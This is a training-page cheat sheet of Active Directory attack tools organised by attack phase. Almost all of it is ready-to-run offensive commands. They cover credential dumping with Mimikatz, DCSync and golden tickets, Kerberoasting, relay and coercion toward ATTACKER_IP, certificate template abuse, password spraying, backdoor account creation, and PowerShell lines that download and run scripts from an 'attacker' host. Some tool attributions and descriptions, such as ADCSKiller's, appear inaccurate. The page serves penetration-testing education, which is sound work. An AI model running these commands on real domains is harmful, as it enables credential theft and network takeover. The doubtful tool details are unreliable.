---
layout: training-page
title: "Active Directory Pentest Tools Reference — Red Team Academy"
module: "Active Directory"
tags:
  - active-directory
  - tools
  - bloodhound
  - mimikatz
  - rubeus
  - crackmapexec
  - impacket
  - certipy
page_key: "ad-tools-reference"
render_with_liquid: false
---

# Active Directory Pentest Tools Reference

A curated reference of 35 tools for Active Directory enumeration, credential dumping, Kerberos abuse, NTLM relay, ADCS attacks, and post-exploitation. Organized by attack phase. For detailed workflows see the individual topic pages (BloodHound, ADCS attacks, coercion, etc.).

## Enumeration & Recon

### BloodHound

```
# BloodHound — graph-based AD attack path visualization
# github.com/BloodHoundAD/BloodHound

# Run SharpHound collector (C# ingestor):
.\SharpHound.exe -c All --outputdirectory C:\temp\
.\SharpHound.exe -c All,GPOLocalGroup --zip
# Output: BloodHound ZIP (JSON files for nodes and edges)

# Import into BloodHound:
# Drag-and-drop ZIP onto BloodHound UI
# Useful pre-built queries:
# - "Find all Domain Admins"
# - "Shortest Paths to Domain Admins"
# - "Find Principals with DCSync Rights"
# - "Find Kerberoastable Users with Most Privileges"

# BloodHound Community Edition (CE):
# docker run -p 8080:8080 specterops/bloodhound
# Ingest with SharpHound or AzureHound (for Entra ID)
```

### Enum4Linux-ng

```
# Enum4Linux-ng — enumerate SMB info from Linux
# github.com/cddmp/enum4linux-ng

pip3 install enum4linux-ng
# Or: git clone https://github.com/cddmp/enum4linux-ng

# Full enumeration:
enum4linux-ng -A 10.10.10.100

# Specific queries:
enum4linux-ng -U 10.10.10.100    # users
enum4linux-ng -G 10.10.10.100    # groups
enum4linux-ng -S 10.10.10.100    # shares
enum4linux-ng -P 10.10.10.100    # password policy

# Output in YAML/JSON:
enum4linux-ng -A -oY results.yml 10.10.10.100
```

### Seatbelt

```
# Seatbelt (GhostPack) — situational awareness for post-exploitation
# github.com/GhostPack/Seatbelt

# Run all checks:
.\Seatbelt.exe -group=all

# Specific check categories:
.\Seatbelt.exe -group=system     # OS, patches, env vars, scheduled tasks
.\Seatbelt.exe -group=user       # browser history, credentials, recent docs
.\Seatbelt.exe -group=misc       # GPO scripts, network shares, AV info

# Individual checks:
.\Seatbelt.exe WindowsCredentialFiles   # cached credentials
.\Seatbelt.exe TokenPrivileges          # current privileges
.\Seatbelt.exe LocalUsers               # local account list
.\Seatbelt.exe LAPS                     # LAPS installation info

# Remote execution (requires admin):
.\Seatbelt.exe -group=system -computername=DC01 -username=corp\admin -password=Password123
```

### Grouper2

```
# Grouper2 — enumerate misconfigured GPOs
# github.com/l0ss/Grouper2

# Download and run:
.\Grouper2.exe

# Output: lists all GPOs with potentially exploitable settings:
# - Mapped drives that point to UNC paths (potential relay)
# - Scheduled tasks running as domain admin
# - Startup scripts with writable paths
# - Software installation from writable shares

# Filter to interesting findings only:
.\Grouper2.exe -i
```

### WADComs

```
# WADComs — interactive cheatsheet for Windows/AD commands
# wadcoms.github.io (web) or github.com/WADComs/WADComs

# Web interface: filter by OS, protocol, tool, and what you have
# (e.g.: Linux + LDAP + Impacket + Domain Creds)

# Generates ready-to-run commands for:
# - SMB enumeration
# - LDAP queries
# - Kerberos attacks
# - DCSync
# - NTLM relay
```

## Credential Dumping & Kerberos Abuse

### Mimikatz

```
# Mimikatz — credential extraction from Windows
# github.com/gentilkiwi/mimikatz

# Dump logon passwords (requires SYSTEM or SeDebugPrivilege):
privilege::debug
sekurlsa::logonpasswords

# Dump NTLM hashes from SAM:
token::elevate
lsadump::sam

# DCSync (replicate DC, requires Domain Admin or replication rights):
lsadump::dcsync /domain:corp.com /user:krbtgt
lsadump::dcsync /domain:corp.com /all /csv

# Golden ticket (replace SID with your domain SID from `whoami /user` or `Get-ADDomain`):
kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-1004336348-1177238915-682003330 /krbtgt:8846f7eaee8fb117ad06bdd830b7586c /ptt

# PTH (Pass-the-Hash) for lateral movement:
sekurlsa::pth /user:Admin /domain:corp.com /ntlm:HASH /run:cmd.exe
```

### Rubeus

```
# Rubeus (GhostPack) — Kerberos abuse toolkit
# github.com/GhostPack/Rubeus

# Kerberoasting — request TGS for SPNs and crack offline:
.\Rubeus.exe kerberoast /nowrap
.\Rubeus.exe kerberoast /user:svc_account /nowrap

# AS-REP Roasting (no pre-auth required):
.\Rubeus.exe asreproast /nowrap

# Request TGT:
.\Rubeus.exe asktgt /user:admin /password:Password123 /domain:corp.com /ptt

# Pass-the-Ticket:
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# S4U abuse (constrained delegation):
.\Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01.corp.com /ptt

# Monitor for new TGTs (on DC):
.\Rubeus.exe monitor /interval:5 /nowrap
```

### SharpLAPS / LAPSDumper

```
# SharpLAPS — dump LAPS passwords via LDAP
# github.com/swisskyrepo/SharpLAPS
.\SharpLAPS.exe /host:DC01.corp.com

# LAPSDumper (Python) — read LAPS from Linux
# github.com/n00py/LAPSDumper
python3 laps.py -u username -p password -d domain.com

# Read LAPS with NetExec:
netexec ldap 10.10.10.100 -u user -p pass -M laps

# Read LAPS with CME:
crackmapexec ldap 10.10.10.100 -u user -p pass --module laps
```

### Pandora — Credential Manager Extraction

```
# Pandora — extracts credentials from Windows Credential Manager
# github.com/efchatz/pandora

# Usage (run as user whose credentials you want):
.\pandora.exe

# Dumps:
# - Windows Credential Manager (generic + Windows credentials)
# - RDP saved passwords
# - Office 365 / SharePoint saved credentials
# - Any application storing creds in CredMan

# Same data accessible via:
cmdkey /list           # list stored credentials
# PowerShell alternative (unprotect a DPAPI blob using current user key):
Add-Type -AssemblyName System.Security
$encrypted = [System.IO.File]::ReadAllBytes("C:\Users\victim\AppData\Local\Microsoft\Credentials\blob.dat")
$plain = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::UTF8.GetString($plain)
# Or via Mimikatz:
vault::cred
```

## NTLM Relay, Coercion & Network Attacks

### Responder

```
# Responder — LLMNR/NBT-NS/WPAD poisoner
# github.com/lgandx/Responder

# Start poisoning (captures NTLMv2 hashes):
sudo python3 Responder.py -I eth0 -wrf

# Common flags:
# -w : WPAD rogue proxy server
# -r : enable answers for netbios wredir queries
# -f : fingerprint OS of each host

# Captured hashes stored in: /usr/share/responder/logs/
# Crack with hashcat:
hashcat -m 5600 captured.txt /usr/share/wordlists/rockyou.txt

# Note: turn off SMB/HTTP if running ntlmrelayx at same time:
sudo python3 Responder.py -I eth0 --lm --disable-ess
```

### Impacket — ntlmrelayx

```
# ntlmrelayx — relay NTLM authentication
# github.com/fortra/impacket

# Relay to LDAP (dump AD info, create user, modify ACLs):
python3 ntlmrelayx.py -tf targets.txt -smb2support --no-http-server
python3 ntlmrelayx.py -t ldaps://DC01.corp.com --delegate-access

# Relay to SMB (dump SAM/LSA, exec commands):
python3 ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Relay to MSSQL (exec xp_cmdshell):
python3 ntlmrelayx.py -t mssql://DB01 -smb2support --query "exec xp_cmdshell 'whoami'"

# Combined with PetitPotam/Coercer to force authentication:
# Terminal 1: ntlmrelayx
# Terminal 2: python3 PetitPotam.py -u user -p pass ATTACKER_IP DC01.corp.com
```

### Coercer

```
# Coercer — force authentication via DCE/RPC
# github.com/p0dalirius/Coercer

pip3 install coercer

# Scan target for coerceable endpoints:
coercer scan -t 10.10.10.100 -u user -p Password123 -d corp.com

# Coerce authentication to attacker machine:
coercer coerce -t 10.10.10.100 -l ATTACKER_IP -u user -p Password123 -d corp.com

# Coercer supports 12+ methods: MS-EFSRPC, MS-RPRN, MS-DFSNM, MS-FSRVP, etc.
# Use with ntlmrelayx to relay DC$ authentication to LDAP for AD CS ESC8 exploit
```

## Active Directory Certificate Services (ADCS)

### Certipy

```
# Certipy — ADCS attack toolkit (ESC1-ESC11)
# github.com/ly4k/Certipy

pip3 install certipy-ad

# Enumerate vulnerable templates:
certipy find -u user@corp.com -p Password123 -dc-ip 10.10.10.100
certipy find -u user@corp.com -p Password123 -dc-ip 10.10.10.100 -vulnerable

# ESC1 — request cert for another user (misconfigured template):
certipy req -u user@corp.com -p Password123 -dc-ip 10.10.10.100 \
  -target CA.corp.com -ca "CORP-CA" -template VulnTemplate \
  -upn Administrator@corp.com

# ESC8 — NTLM relay to AD CS HTTP endpoint:
# (requires coercing DC$ auth with Coercer first)
certipy relay -target http://CA.corp.com/certsrv/certfnsh.asp -ca "CORP-CA"

# Authenticate with certificate and dump NTLM hash:
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
```

### ADCSKiller

```
# ADCSKiller — automates enumeration and exploitation of ADCS
# github.com/cube0x0/ADCSKiller

# Clone and compile (C#):
git clone https://github.com/cube0x0/ADCSKiller
# Build in Visual Studio or with MSBuild

# Run:
.\ADCSKiller.exe /domain:corp.com /user:user /password:Password123

# Automates:
# - Enumerate all CAs and templates
# - Identify ESC1–ESC8 conditions
# - Attempt exploitation if vulnerable
# - Output certificate files for authentication
```

## Post-Exploitation & Lateral Movement

### CrackMapExec / NetExec

```
# CrackMapExec (CME) / NetExec (nxc) — AD swiss army knife
# CME: github.com/byt3bl33d3r/CrackMapExec
# NetExec (CME fork, actively maintained): github.com/Pennyw0rth/NetExec

pip3 install netexec

# Password spray:
nxc smb 10.10.10.0/24 -u users.txt -p Password123 --continue-on-success

# Dump SAM (local admin):
nxc smb 10.10.10.100 -u admin -p Password123 --sam

# Dump LSA secrets:
nxc smb 10.10.10.100 -u admin -p Password123 --lsa

# NTDS dump (domain admin, direct from DC):
nxc smb 10.10.10.100 -u admin -p Password123 --ntds

# Execute command:
nxc smb 10.10.10.100 -u admin -p Password123 -x "whoami"

# Check LAPS:
nxc ldap 10.10.10.100 -u admin -p Password123 -M laps

# WMI execution:
nxc wmi 10.10.10.100 -u admin -p Password123 -x "net user hacker P@ss123 /add"

# List shares:
nxc smb 10.10.10.0/24 -u user -p pass --shares
```

### BloodyAD

```
# BloodyAD — abuse AD ACLs for privilege escalation
# github.com/CravateRouge/BloodyAD

pip3 install bloodyad

# Add user to group (requires GenericAll/GenericWrite on group):
bloodyAD -d corp.com -u attacker -p Password123 --host DC01 \
  add groupMember "Domain Admins" attacker

# Change user password (requires GenericAll on user):
bloodyAD -d corp.com -u attacker -p Password123 --host DC01 \
  set password targetuser "NewPassword123!"

# Grant DCSync rights (requires WriteDACL on domain):
bloodyAD -d corp.com -u attacker -p Password123 --host DC01 \
  add dcsync attacker

# Enable RBCD (Resource-Based Constrained Delegation):
bloodyAD -d corp.com -u attacker -p Password123 --host DC01 \
  set rbcd targetcomputer$ attackercomputer$
```

### Whisker / PyWhisker — Shadow Credentials

```
# Whisker (C#) / PyWhisker (Python) — add shadow credentials via msDS-KeyCredentialLink
# Whisker: github.com/eladshamir/Whisker
# PyWhisker: github.com/ShutdownRepo/pywhisker

# Requires: GenericAll or WriteProperty on target object

# Add shadow credentials to target account (C#):
.\Whisker.exe add /target:TargetUser

# Add shadow credentials (Python, from Linux):
python3 pywhisker.py -d corp.com -u attacker -p Password123 \
  --target TargetUser --action add

# Output: certificate PFX + password
# Authenticate with Rubeus using the PFX:
.\Rubeus.exe asktgt /user:TargetUser /certificate:cert.pfx /password:PFX_PASS /ptt

# Related: see /active-directory/shadow-credentials/ for full workflow
```

### SharpView

```
# SharpView — AD enumeration in C# (port of PowerView)
# github.com/dmchell/SharpView

# Equivalent to PowerView but runs as native .NET (no PowerShell restrictions)

# Get domain users:
.\SharpView.exe Get-DomainUser

# Get kerberoastable users:
.\SharpView.exe Get-DomainUser -SPN

# Get computers:
.\SharpView.exe Get-DomainComputer

# Find local admin:
.\SharpView.exe Find-LocalAdminAccess

# Get GPO:
.\SharpView.exe Get-DomainGPO

# Find interesting ACLs:
.\SharpView.exe Find-InterestingDomainAcl -ResolveGUIDs
```

### PowerSploit

```
# PowerSploit — offensive PowerShell scripts
# github.com/PowerShellMafia/PowerSploit

# Load into memory (bypass AMSI first):
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# PowerView (recon):
Get-Domain
Get-DomainUser -Identity admin
Get-DomainGroupMember "Domain Admins"
Find-LocalAdminAccess -Verbose
Get-DomainGPOLocalGroup

# PowerUp (privilege escalation):
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1')
Invoke-AllChecks

# PowerSploit Persistence:
Add-Persistence -ScriptBlock $sb -ElevatedPrivUser -Verbose
```

### DCOMrade — DCOM Lateral Movement

```
# DCOMrade — discover vulnerable DCOM objects for remote execution
# github.com/antonioCoco/DCOMrade

# Compile and run from Windows host:
# Enumerates DCOM applications on a remote machine
.\DCOMrade.exe -c TARGET_IP -u domain\user -p Password123

# Lists DCOM CLSIDs that can be used for remote code execution
# Use with impacket dcomexec for execution:
python3 dcomexec.py -object ShellWindows domain/user:pass@TARGET_IP 'whoami'
python3 dcomexec.py -object MMC20 domain/user:pass@TARGET_IP 'whoami'
```

## Miscellaneous & Analysis

### ADExplorerSnapshot.py

```
# ADExplorerSnapshot.py — compare AD Explorer snapshot files
# github.com/csandker/ADExplorerSnapshot.py

pip3 install adexplorer-snapshot

# Convert AD Explorer snapshot to BloodHound-compatible JSON:
python3 ADExplorerSnapshot.py snapshot.dat -o output/

# Compare two snapshots (detect changes in AD):
python3 ADExplorerSnapshot.py snapshot1.dat snapshot2.dat --compare

# ADExplorer (Sysinternals) takes snapshots of entire AD offline:
# Run: ADExplorer.exe → File → Create Snapshot
# Useful for: offline analysis, compliance, delta comparison
```

## Quick Reference — Tool Selection by Attack Phase

```
# Phase 1 — Initial Enumeration (unauthenticated):
# enum4linux-ng -A TARGET            # SMB: users, shares, policy
# nxc smb TARGET -u '' -p ''        # null session check
# nxc smb TARGET -u guest -p ''     # guest access check
# nmap -p 88,389,445,636,3268 TARGET # AD port check

# Phase 2 — Authenticated Enumeration:
# .\SharpHound.exe -c All            # BloodHound collection
# .\SharpView.exe Get-DomainUser -SPN  # Kerberoastable targets
# .\Seatbelt.exe -group=all           # situational awareness
# Grouper2.exe                        # GPO misconfigs
# certipy find -vulnerable            # ADCS misconfigs

# Phase 3 — Credential Attacks:
# .\Rubeus.exe kerberoast /nowrap     # Kerberoasting
# .\Rubeus.exe asreproast /nowrap     # AS-REP Roasting
# nxc smb hosts.txt -u users -p pass  # password spray

# Phase 4 — Lateral Movement:
# .\SharpLAPS.exe                                                          # LAPS password dump
# nxc smb TARGET --sam / --lsa                                             # local credential dump
# python3 ntlmrelayx.py -tf targets -smb2support                           # NTLM relay
# bloodyAD -u user -p pass -d corp.local --host DC01 add groupMember 'Domain Admins' attacker  # ACL abuse

# Phase 5 — DA / DCSync:
# lsadump::dcsync /user:krbtgt                                             # DCSync via Mimikatz
# python3 secretsdump.py corp/admin:pass@DC01                              # remote DCSync
# certipy req -u user@corp.local -p pass -ca CORP-CA -template User -upn Administrator@corp.local  # ADCS cert for DA
```

## Resources

- BloodHound — `github.com/BloodHoundAD/BloodHound`
- SharpHound — `github.com/BloodHoundAD/SharpHound`
- Rubeus (GhostPack) — `github.com/GhostPack/Rubeus`
- Mimikatz — `github.com/gentilkiwi/mimikatz`
- Impacket — `github.com/fortra/impacket`
- NetExec — `github.com/Pennyw0rth/NetExec`
- Certipy — `github.com/ly4k/Certipy`
- Coercer — `github.com/p0dalirius/Coercer`
- BloodyAD — `github.com/CravateRouge/BloodyAD`
- PyWhisker — `github.com/ShutdownRepo/pywhisker`
- WADComs interactive cheatsheet — `wadcoms.github.io`
- GhostPack compiled binaries — `github.com/r3motecontrol/Ghostpack-CompiledBinaries`
- Awesome AD Pentest Tools — `github.com/deM0Nk3Y/Awesome-Active-Directory-PenTest-Tools`
- Related: [BloodHound / SharpHound](/active-directory/bloodhound/)
- Related: [ADCS Attacks](/active-directory/adcs-attacks/)
- Related: [Coercion Attacks](/active-directory/coercion-attacks/)
- Related: [Shadow Credentials](/active-directory/shadow-credentials/)
